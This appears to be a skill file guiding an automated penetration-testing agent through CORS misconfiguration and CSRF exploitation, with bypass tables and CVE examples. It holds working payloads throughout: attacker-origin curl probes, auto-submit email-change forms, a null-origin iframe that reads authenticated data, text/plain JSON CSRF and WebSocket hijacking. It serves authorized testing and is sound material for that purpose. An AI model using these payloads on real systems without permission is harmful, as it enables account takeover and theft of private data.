---
name: "CORS & CSRF"
description: "Test CORS misconfiguration (reflected/null/regex-bypass origins with credentials) and CSRF (missing/forgeable anti-CSRF token, SameSite gaps, method/content-type bypass). Deterministic header-reflection and cross-origin-read proof."
tags: ["cors", "csrf", "info_disclosure"]
recommended_tools: ["curl", "python3"]
vuln_classes: ["cors", "csrf", "info_disclosure"]
domain: web
phase: exploitation
---
# CORS & CSRF

Maps to vuln_classes: cors, csrf, info_disclosure (cross-origin data read).

## CORS misconfiguration

### Where to look
Any authenticated JSON API. Inspect responses for `Access-Control-Allow-Origin` (ACAO) and `Access-Control-Allow-Credentials` (ACAC).

### Payload ladder: detect -> confirm -> escalate
Send an attacker `Origin` and observe what the server reflects.
```
# 1. Arbitrary origin reflected + credentials
curl -s -I -H "Origin: https://attacker.tld" -H "Cookie: session=..." https://target/api/me
#   ACAO: https://attacker.tld  AND  ACAC: true   => EXPLOITABLE (read authed data cross-origin)

# 2. null origin (sandboxed iframe / data: URI)
curl -s -I -H "Origin: null" https://target/api/me      # ACAO: null + ACAC: true => exploitable via <iframe sandbox>

# 3. Prefix/suffix regex bypass
Origin: https://target.attacker.tld         # suffix match flaw
Origin: https://attacker-target.tld          # substring flaw
Origin: https://target.tld.attacker.tld
Origin: https://target.tld.evil.tld
Origin: http://target.tld                    # scheme downgrade accepted?
```

### Proof of impact (deterministic)
Reflected-origin + `ACAC: true` is the misconfig. Prove impact with a working cross-origin read: from `attacker.tld`, `fetch('https://target/api/me',{credentials:'include'})` returns the victim's authed JSON (capture the body). If `ACAO: *` then `ACAC` CANNOT be true (browsers block credentialed wildcard) — `*` alone is only impactful for unauthenticated sensitive endpoints. Send an in-scope control `Origin` to confirm the reflection is dynamic, not a static config.

## CSRF

### Where to look
State-changing requests (POST/PUT/PATCH/DELETE): password/email change, fund transfer, role change, settings. Check for an anti-CSRF token and cookie `SameSite` attribute.

### Payload ladder
```
1. Drop the CSRF token entirely -> does the request still succeed?
2. Empty / malformed / reused-from-another-session token -> still accepted?
3. Swap method: if token only checked on POST, try PUT/PATCH or ?_method=POST.
4. Content-type swap: token-bearing JSON endpoint that also accepts
   application/x-www-form-urlencoded or text/plain -> forgeable via auto-submit HTML form
   (simple-request, no preflight, no token).
5. SameSite gap: cookie SameSite=None (or absent on old browsers) + no token => classic CSRF.
6. Token-not-tied-to-session: attacker's own valid token accepted in victim context.
```
PoC (auto-submit form for form/text-encoded endpoints):
```
<form action="https://target/api/change-email" method=POST>
  <input name=email value=attacker@evil.tld></form>
<script>document.forms[0].submit()</script>
```

### Deterministic proof signal
The forged cross-origin request (no token / forged token, attacker-controlled value) causes a SERVER-SIDE state change that persists: re-read the resource as the victim and confirm the attacker-set value (e.g. email/role changed). 'Request returned 200' is not enough — the state change must be observable on re-read. For CORS, the proof is the victim's private JSON body returned to an attacker origin.

## Chaining
- CORS read -> exfil CSRF token -> CSRF on token-protected endpoint.
- CORS reflected origin -> steal API responses containing JWTs/keys (route to info_disclosure / jwt-attacks).

CWE-352 (CSRF), CWE-942 (Permissive Cross-domain Policy / overly permissive CORS), CWE-346.

## Modern techniques & real-world CVEs (via recon-skills)

### Browser-model gate (why curl reflection is not proof)
curl ignores CORS and SameSite entirely — a reflected header or a 200 from curl is a lead, never a finding. Two hard browser rules kill most "findings", check them first:
- `Access-Control-Allow-Origin: *` CANNOT be combined with credentials — the browser refuses to expose the body for a `credentials:include` fetch. Wildcard-only is exploitable only for sensitive *unauthenticated* data (usually Low).
- `ACAC: true` alone proves nothing — it must pair with your reflected attacker origin AND a real browser fetch that returns a readable body. Every CORS High needs a browser PoC that logs the authed body from `evil.com`; a `BLOCKED`/TypeError means no finding.

For CSRF, `SameSite=Lax` on a POST endpoint is NOT exploitable via cross-site POST — a curl POST succeeding with the cookie is a false positive. Lax only sends the cookie on top-level-navigation GET.

| Cookie attribute | Browser sends cookie on |
|---|---|
| `SameSite=None` (needs `Secure`) | all cross-site requests |
| `SameSite=Lax` | cross-site top-level GET only — blocks POST |
| `SameSite=Strict` | same-site only |
| not set (modern default) | treated as Lax |

### Regex-flaw-to-payload matching (trusted-origin allowlist bypass)
The correct bypass depends on *which* regex flaw the server has. Sending `target.com.evil.com` against an end-anchored escaped-dot regex is not a bug. Identify the class, then send the matching origin (must be a *registerable* origin you control):

| Server regex (intends `*.target.com`) | Flaw | Bypass origin |
|---|---|---|
| `^https?://.*target\.com$` | missing dot separator | `https://eviltarget.com` |
| `^https?://.*\.target\.com` | missing end-anchor `$` | `https://x.target.com.evil.com` |
| `^https?://target\.com` | prefix-only, no `$` | `https://target.com.evil.com` |
| `.*.target.com$` (dot unescaped) | `.` = any char | `https://evilXtargetXcom`-style |
| any | parser quirks | `https://target.com%60.evil.com` (backtick), underscore, older-browser origins — confirm the browser actually emits it |

```bash
for ORIGIN in "https://eviltarget.com" "https://x.target.com.evil.com" \
  "https://target.com.evil.com" "https://target.com%60.evil.com" "http://target.com"; do
  echo -n "[$ORIGIN] "; curl -s -D - -o /dev/null "https://$TARGET/api/me" \
    -H "Origin: $ORIGIN" -H "Cookie: $SESSION_COOKIE" | grep -i "access-control" || echo "no CORS"
done
```

### Pre-flight (OPTIONS) write-path bypass — CORS chains to CSRF
Non-simple requests (custom headers, PUT/DELETE/PATCH, non-simple Content-Type) trigger a preflight. If the preflight reflects your origin AND authorizes arbitrary methods/headers, a malicious origin can drive authed state changes that JSON/SameSite would otherwise block:
```bash
curl -s -D - -o /dev/null -X OPTIONS "https://$TARGET/api/account/email" \
  -H "Origin: https://evil.com" -H "Access-Control-Request-Method: PUT" \
  -H "Access-Control-Request-Headers: x-custom-auth, content-type" | grep -i "access-control"
# Vulnerable: ACAO reflects evil.com + ACAC:true + Allow-Methods: PUT + Allow-Headers: x-custom-auth
```
Some servers reflect on OPTIONS but not on GET (V4 preflight-only) — always test both the preflight and the real GET/POST.

### Null-origin read via sandboxed iframe
A `sandbox` iframe without `allow-same-origin` has an opaque origin, emitting `Origin: null`. If `ACAO: null` + `ACAC: true`, any page can read the authed body:
```html
<iframe sandbox="allow-scripts" srcdoc='
  <script>fetch("https://TARGET/api/me",{credentials:"include"})
    .then(r=>r.text()).then(d=>parent.postMessage(d,"*"));</script>'></iframe>
<script>window.addEventListener("message",e=>console.log("NULL-ORIGIN READ:",e.data));</script>
```
Alternative null-origin emitters: `data:`/`blob:` documents, or a 302 redirect chain with a cross-scheme final hop.

### postMessage origin-check flaws (client-side CORS)
Separate class from HTTP CORS; impact is DOM-side. Flag handlers that use `event.data` without strictly validating `event.origin`:
```bash
grep -rEn "addEventListener\(['\"]message" ./ --include="*.js" | grep -v "\.origin"
# Weak checks: .indexOf("target.com")>-1 ; .endsWith("target.com") ; startsWith("https://target")
```

### Modern CSRF variants & disclosed reports (2021-2024)
- **Argo CD SameSite=Lax sibling-subdomain bypass (CVE-2024-22424)** — page on `marketing.victim.com` hits `argocd.internal.victim.com`; Lax is moot when the attacker controls any sibling subdomain of the shared parent, and Argo CD did not enforce `Content-Type: application/json`. `fetch('https://argocd.internal.victim.com/api/v1/applications',{method:'POST',credentials:'include',body:'{"metadata":{"name":"pwn"},...}'})`. Fixed 2.7.16/2.8.8/2.9.4.
- **GitLab GraphQL mutations-via-GET ($3,370, H1 #1122408)** — `X-CSRF-Token` skipped when method is GET; mutations accepted via query string: `<img src="https://gitlab.com/api/graphql?query=mutation{createSnippet(input:{...})}">`.
- **Stripe Dashboard CSRF middleware globally disabled ($5,000, H1 #1483327)** — a deploy turned off CSRF middleware across all endpoints; exploited with `enctype="text/plain"` JSON form.
- **GitHub Enterprise CSRF via path traversal (CVE-2022-23732, $10k)** — router matched post-traversal path for execution but pre-traversal path for CSRF scope: `action="https://ghes/setup/api/start/..%2f..%2fadmin%2fusers"`.
- **HackerOne social-account-link CSRF -> ATO (H1 #1727221)** — link-callback token not user-bound: `<img src="https://hackerone.com/users/social_accounts/google?code=ATTACKER_CODE&state=PREDICTABLE">`.
- **TikTok JSON-CSRF via text/plain email-change ($500)** and **Origin-omission bypass ($2,500)**; **YoYo Games default-SameSite email-change -> ATO**; **Coda WebSocket CSRF (CSWSH)**.

### JSON CSRF via text/plain (Content-Type enforcement bypass)
If a JSON endpoint also accepts `text/plain`, a form generates valid JSON with no preflight and no token:
```html
<form method="POST" action="https://target.com/api/heartbeat" enctype="text/plain">
  <input name='{"status":"ok","x":"' value='padding"}' /></form>
<script>document.forms[0].submit()</script>
```

### WebSocket CSRF (CSWSH)
Browser WebSockets cannot send custom headers, so token/`X-CSRF` checks on the upgrade are impossible — devs often exclude WS/SignalR paths from CSRF. Any same-site origin then opens the socket with the ambient cookie:
```js
new WebSocket("wss://bff.example.com/hubs/admin"); // cookie sent, no token; invoke DeleteUser(id) via JSON frame
```
Enumerate `/hubs/*`, `/signalr/*`; a `101 Switching Protocols` with only the session cookie means CSWSH is viable.

### Duende BFF antiforgery (2024-2026 ASP.NET Core SPA surface)
Duende BFF requires only a *static* header `X-CSRF: 1` (identical for every caller; exists only to force a CORS preflight) on BFF-mapped endpoints — it is NOT user/role-bound, unlike stock ASP.NET Core antiforgery. Three design-level attack classes (become live findings when chained with a co-resident primitive):
1. Cross-role replay same-origin — a low-priv session that lands any same-origin script (self-XSS, subdomain-takeover JS) can `fetch('/bff/admin/users/delete?id=42',{credentials:'include',headers:{'X-CSRF':'1'}})` and reach admin endpoints if the victim holds the admin role.
2. SignalR/WebSocket carve-out — hubs registered with `DisableAntiforgery()` -> CSWSH as above.
3. Cookie-domain wildcarding — `options.Cookie.Domain=".example.com"` drops `__Host-` protection; subdomain takeover -> `Set-Cookie: .AspNetCore.Cookies=<attacker>; Domain=.example.com` -> session-fixation ATO.
No Duende.BFF-direct CVE as of 2026; report on chain impact. Hunt: `curl https://target/bff/user -H 'X-CSRF: 1' -b '<session>'` dumps the full claim set (info disclosure alone); inspect `/bff/login` `Set-Cookie` for `Domain=` vs `__Host-`.

### WordPress REST API endpoint-masking (bulk automation trap)
CORS headers are frequently ABSENT on root `/` but PRESENT on API endpoints, and default WordPress REST config (endemic on WP Engine, also Apache/nginx) reflects `ACAO: <origin>` + `ACAC: true` for any origin — even behind Cloudflare, because the header originates at the app layer. Test ALL REST namespaces, not just `/wp/v2/users`; 401/403 endpoints still emit CORS and become readable 200s when an admin is logged in:
```bash
for ep in /wp-json/wp/v2/users /wp-json/wp/v2/posts /wp-json/wp/v2/media \
  /wp-json/wp/v2/comments /wp-json/wp/v2/settings /wp-json/wc/v3/products \
  /wp-json/gf/v2/forms; do
  cors=$(curl -sk -I "https://$TARGET${ep}" -H "Origin: https://evil.com" | grep -iE "access-control-allow-origin|access-control-allow-credentials")
  echo "${ep} | ${cors:-NO CORS}"
done
```
Triage tooling (`corsy`, `nuclei -t http/misconfiguration/cors/`) is lead-only; reproduce every hit with a browser PoC.

### Chaining
- CORS reflect -> browser-read `/api/csrf` to steal the token -> forge state change on a CSRF-protected form.
- CORS reflect -> read `/api/tokens`/`/api/me` for JWTs/keys -> route to info_disclosure / jwt-attacks.
- Trusted-subdomain XSS or dangling-CNAME takeover -> host the credentialed read PoC on the now-trusted origin.

CWE-352 (CSRF), CWE-942 / CWE-346 (permissive CORS), CWE-1385 (weak origin validation).
